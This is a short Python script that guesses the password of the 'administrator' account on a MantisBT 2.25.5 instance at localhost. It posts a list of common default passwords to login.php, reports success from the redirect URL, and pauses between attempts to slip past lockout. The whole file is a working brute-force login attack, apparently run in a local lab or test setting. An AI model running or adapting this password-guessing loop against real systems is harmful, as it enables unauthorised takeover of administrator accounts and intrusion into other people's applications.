import requests

s = requests.Session()
BASE = 'http://localhost/mantisbt-2.25.5'

# Get login page and find return URL
r = s.get(f'{BASE}/login_page.php')
# Try common passwords one at a time, waiting between attempts
import time
passwords = ['root', 'password', 'mantis', 'admin123', 'P@ssw0rd', 'administrator', 'mantisbt', 'changeme']
for p in passwords:
    s2 = requests.Session()
    r = s2.get(f'{BASE}/login_page.php')
    r = s2.post(f'{BASE}/login.php', data={'username': 'administrator', 'password': p}, allow_redirects=True)
    if 'login_page' in r.url:
        print(f'  {p:20} FAIL')
    else:
        print(f'  {p:20} OK -> {r.url[-50:]}')
    time.sleep(1)